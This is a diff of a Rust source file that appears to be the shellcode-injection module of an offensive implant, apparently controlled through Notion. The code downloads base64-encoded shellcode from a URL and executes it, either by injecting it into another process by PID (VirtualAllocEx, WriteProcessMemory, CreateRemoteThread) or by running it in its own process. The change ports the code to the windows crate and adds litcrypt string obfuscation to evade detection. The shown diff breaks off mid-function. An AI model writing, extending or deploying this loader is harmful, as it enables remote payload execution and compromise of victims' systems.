@@ -1,33 +1,47 @@
 use std::error::Error;
-use crate::logger::Logger;
-use crate::cmd::{CommandArgs, notion_out};
-
+use litcrypt::lc;
 use base64::decode as b64_decode;
-#[cfg(windows)] extern crate winapi;
-#[cfg(windows)] extern crate kernel32;
-#[cfg(windows)] use winapi::um::winnt::{
-    PROCESS_ALL_ACCESS,
-    MEM_COMMIT,
-    MEM_RESERVE,
-    PAGE_EXECUTE_READWRITE,
-    PAGE_EXECUTE_READ,
-    PAGE_READWRITE,
-    PVOID
-};
-#[cfg(windows)] use winapi::um::{
-    //errhandlingapi,
-    processthreadsapi,
-    winbase, 
-    synchapi::WaitForSingleObject
+use reqwest::Client;
+use crate::logger::{Logger, log_out};
+use crate::cmd::{CommandArgs, notion_out};
+#[cfg(windows)] use windows::Win32:: {
+    Foundation::{
+        CloseHandle,
+        GetLastError,
+        BOOL, 
+    },
+    System::{
+        Memory::{
+            VirtualAlloc,
+            VirtualAllocEx, 
+            VirtualProtect, 
+            PAGE_PROTECTION_FLAGS,
+            MEM_COMMIT,
+            MEM_RESERVE,
+            PAGE_READWRITE,
+            PAGE_EXECUTE_READ,
+            PAGE_EXECUTE_READWRITE
+        },
+        Threading::{
+            OpenProcess,
+            CreateThread,
+            CreateRemoteThread,
+            WaitForSingleObject,
+            THREAD_CREATION_FLAGS,
+            PROCESS_ALL_ACCESS
+        },
+        Diagnostics::Debug::WriteProcessMemory,
+        WindowsProgramming::INFINITE
+    },
 };
 #[cfg(windows)] use std::ptr;
-use reqwest::Client;
+#[cfg(windows)] use core::ffi::c_void; 
 
-async fn decode_shellcode(sc: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, &str> {
-    logger.debug("Starting shellcode debug".to_string());
+async fn decode_shellcode(sc: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, String> {
+    logger.debug(log_out!("Starting shellcode debug"));
     let mut shellcode_vec = Vec::from(sc.trim().as_bytes());
     for i in 0..b64_iterations {
-        logger.debug(format!("Decode iteration: {i}"));
+        logger.debug(log_out!("Decode iteration: ", &i.to_string()));
         match b64_decode(shellcode_vec) {
             Ok(d) => {
                 shellcode_vec = d
@@ -37,8 +51,8 @@ async fn decode_shellcode(sc: String, b64_iterations: u32, logger: &Logger) -> R
             },
             Err(e) => { 
                 let err_msg = e.to_string();
-                logger.err(format!("{}", err_msg.to_owned()));
-                return Err("Could not decode shellcode"); 
+                logger.err(err_msg.to_owned());
+                return Err(err_msg.to_owned()); 
             }
         };
     }
@@ -48,18 +62,18 @@ async fn decode_shellcode(sc: String, b64_iterations: u32, logger: &Logger) -> R
 
 /// Handles the retrieval and deobfuscation of shellcode from a url.
 
-async fn get_shellcode(url: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, &str> {
+async fn get_shellcode(url: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, String> {
     // Download shellcode, or try to
     let client = Client::new();
     if let Ok(r) = client.get(url).send().await {
         if r.status().is_success() {   
-            logger.info(format!("Downloaded shellcode")); 
+            logger.info(log_out!("Downloaded shellcode")); 
             // Get the shellcode. Now we have to decode it
             let shellcode_decoded: Vec<u8>;
             let shellcode_final_vec: Vec<u8>;
             if let Ok(sc) = r.text().await {
-                logger.info(format!("Got encoded bytes"));
-                logger.debug(format!("Encoded shellcode length: {}", sc.len()));
+                logger.info(log_out!("Got encoded bytes"));
+                logger.debug(log_out!("Encoded shellcode length: ", &sc.len().to_string()));
                 match decode_shellcode(sc, b64_iterations, logger).await {
                     Ok(scd) => { shellcode_decoded = scd; },
                     Err(e)  => { return Err(e); }
@@ -73,9 +87,9 @@ async fn get_shellcode(url: String, b64_iterations: u32, logger: &Logger) -> Res
                     if let Ok(s) = String::from_utf8(shellcode_decoded) {
                         shellcode_string = s;
                     } else {
-                        let err_msg = "Could not convert shellcode bytes to string";
-                        logger.err(err_msg.to_string());
-                        return Err("Could not convert shellcode bytes to string");
+                        let err_msg = lc!("Could not convert bytes to string");
+                        logger.err(err_msg.to_owned());
+                        return Err(err_msg.to_owned());
                     }                    
                     // At this point, we have the comma-separated "0xNN" form of the shellcode.
                     // We need to get each one until a proper u8.
@@ -102,17 +116,17 @@ async fn get_shellcode(url: String, b64_iterations: u32, logger: &Logger) -> Res
                 return Ok(shellcode_final_vec);
 
             } else {
-                let err_msg = "Could not decode shellcode";
-                logger.err(err_msg.to_string());
-                return Err(err_msg);
+                let err_msg = lc!("Could not decode shellcode");
+                logger.err(err_msg.to_owned());
+                return Err(err_msg.to_owned());
             }
 
         } else {
-            return Err("Could not download shellcode");
+            return Err(r.text().await.unwrap());
         }   
 
     } else {
-        return Err("Could not download shellcode");
+        return Err(lc!("Could not download shellcode"));
     }
 } 
 
@@ -145,7 +159,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
         // Get URL
         match cmd_args.nth(0) {
             Some(u) => { 
-                logger.debug(format!("Shellcode URL: {}", &u));
+                logger.debug(log_out!("Shellcode URL: ", &u));
                 url = u; 
             },
             None    => { return notion_out!("Could not parse URL"); }
@@ -178,35 +192,33 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                 match cmd_args.nth(0) {
                     Some(ps) => {
                         if let Ok(p) = ps.parse::<u32>() {
-                            logger.debug(format!("Injecting into PID: {:?}", &p));
+                            logger.debug(log_out!("Injecting into PID: ", &p.to_string()));
                             pid = p;
                             // Big thanks to trickster0
                             // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
                             unsafe {
-                                let h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
-                                let addr = kernel32::VirtualAllocEx(h, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
+                                let h = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+                                let addr = VirtualAllocEx(h, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
                                 let mut n = 0;
-                                kernel32::WriteProcessMemory(h,addr,shellcode.as_ptr() as  _, shellcode.len() as u64,&mut n);
-                                let _h_thread = kernel32::CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
-                                kernel32::CloseHandle(h);
+                                WriteProcessMemory(&h, addr, shellcode.as_ptr() as  _, shellcode.len(), &mut n);
+                                let _h_thread = CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
+                                CloseHandle(&h);
                             }
                             return notion_out!("Injection completed!");
                         } else {
-                            let err_msg = "Could not parse PID";
-                            logger.err(err_msg.to_string());
-                            return Ok(err_msg.to_string());
+                            let err_msg = lc!("Could not parse PID");
+                            logger.err(err_msg.to_owned());
+                            return Ok(err_msg.to_owned());
                         }
                     },
                     None => { 
-                        let err_msg = "Could not extract PID";
-                        logger.err(err_msg.to_string());
-                        return Ok(err_msg.to_string()); 
+                        let err_msg = lc!("Could not extract PID");
+                        logger.err(err_msg.to_owned());
+                        return Ok(err_msg.to_owned()); 
                     }
                 };
             },
             "self"  => {
-                type DWORD = u32;
-
                 // Get shellcode
                 let mut shellcode: Vec<u8>; 
                 match get_shellcode(url, b64_iterations, logger).await {
@@ -214,63 +226,63 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                     Err(e) => { return Ok(e.to_string()) }
                 };
 
-                logger.debug(format!("Injecting into current process..."));
+                logger.debug(log_out!("Injecting into current process..."));
                 unsafe {
-                    let base_addr = kernel32::VirtualAlloc(
+
+                    let base_addr = VirtualAlloc(
                         ptr::null_mut(),
-                        shellcode.len().try_into().unwrap(),
+                        shellcode.len(),
                         MEM_COMMIT | MEM_RESERVE,
                         PAGE_READWRITE,
                     );
 
                     if base_addr.is_null() {
-                        logger.err("Couldn't allocate memory to current proc.".to_string())
+                        logger.err(log_out!("Couldn't allocate memory to current proc."));
                     } else {
-                        logger.debug("Allocated memory to current proc.".to_string());
+                        logger.debug(log_out!("Allocated memory to current proc."));
                     }
 
                     // copy shellcode into mem
-                    logger.debug("Copying Shellcode to address in current proc.".to_string());
+                    logger.debug(log_out!("Copying Shellcode to address in current proc."));
                     std::ptr::copy(shellcode.as_ptr() as _, base_addr, shellcode.len());
-                    logger.debug("Copied...".to_string());
+                    logger.debug(log_out!("Copied..."));
 
                     // Flip mem protections from RW to RX with VirtualProtect. Dispose of the call with `out _`
-                    logger.debug("Changing mem protections to RX...".to_string());
+                    logger.debug(log_out!("Changing mem protections to RX..."));
 
-                    let mut old_protect: DWORD = PAGE_READWRITE;
+                    let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
 
-                    let mem_protect = kernel32::VirtualProtect(
+                    let mem_protect: BOOL = VirtualProtect(
                         base_addr,
-                        shellcode.len() as u64,
+                        shellcode.len(),
                         PAGE_EXECUTE_READ,
                         &mut old_protect,
                     );
+        
 
-                    if mem_protect == 0 {
-                        //let error = errhandlingapi::GetLastError();
-                        return Ok(format!("Error during injection"));
+                    if mem_protect.0 == 0 {
+                        return notion_out!("Error during injection");
                     }
 
                     // Call CreateThread
-                    logger.debug("Calling CreateThread...".to_string());
+                    logger.debug(log_out!("Calling CreateThread..."));
 
                     let mut tid = 0;
-                    let ep: extern "system" fn(PVOID) -> u32 = { std::mem::transmute(base_addr) };
+                    let ep: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(base_addr) };
 
-                    let h_thread = processthreadsapi::CreateThread(
+                    let h_thread = CreateThread(
                         ptr::null_mut(),
                         0,
                         Some(ep),
                         ptr::null_mut(),
-                        0,
+                        THREAD_CREATION_FLAGS(0),
                         &mut tid,
                     );
 
-                    if h_thread.is_null() {
-                        //let error = unsafe { errhandlingapi::GetLastError() };
-                        logger.err(format!("Error during inject."));
+                    if h_thread.is_invalid() {
+                        logger.err(log_out!("Error during inject."));
                     } else {
-                        logger.info(format!("Thread Id: {tid}"));
+                        logger.info(log_out!("Thread Id: ", &tid.to_string()));
                     }
 
                     // CreateThread is not a blocking call, so we wait on the thread indefinitely with WaitForSingleObject. This blocks for as long as the thread is running
